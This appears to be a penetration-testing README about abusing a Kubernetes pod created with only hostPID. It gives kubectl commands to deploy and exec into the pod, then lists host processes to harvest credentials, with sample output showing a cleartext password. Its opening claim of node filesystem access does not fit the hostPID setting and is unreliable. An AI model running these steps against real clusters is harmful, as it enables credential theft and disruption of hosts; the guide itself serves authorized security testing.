## You can create a pod with only hostPID

You are exploiting the fact that there are no polices preventing the creation of pod with access to the node's filesystem. You are going to create a pod and gain full read/write access to the filesystem of the node the pod is running on. 

[pod-hostpid-only.yaml](pod-hostpid-only.yaml)

### Create a pod
```bash
# Option 1: Create pod from local yaml 
kubectl apply -f pod-hostpid-only.yaml   
# Option 2: Create pod from github hosted yaml
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/hostpid-only/pod-hostpid-only.yaml  
```

### Exec into pod 
```bash 
kubectl -n [namespace] exec -it pod-hostpid-only -- bash
```

# Post exploitation
```bash
# View all processes running on the host and look for passwords, tokens, keys, etc. 
# Check out that clear text password in the ps output below! 

ps -aux
...omitted for brevity...
root     2123072  0.0  0.0   3732  2868 ?        Ss   21:00   0:00 /bin/bash -c while true; do ./my-program --grafana-uername=admin --grafana-password=admin; sleep 10;done
...omitted for brevity...

# Also, you can also kill any process, but don't do that in production :)
```


#### Attacks that apply to all pods, even without any special permissions
* Cloud metadata service
* `Kube-apiserver` or `kubelet` with `anonymous-auth` enabled
* Kubernetes exploits
* Hunting for vulnerable application/services in the cluster

# Demonstrate Impact

If you are performing a penetration test, the end goal is not to gain cluster-admin, but rather to demonstrate the impact of exploitation. Use the access you have gained to accomplish the objectives of the pentration test.

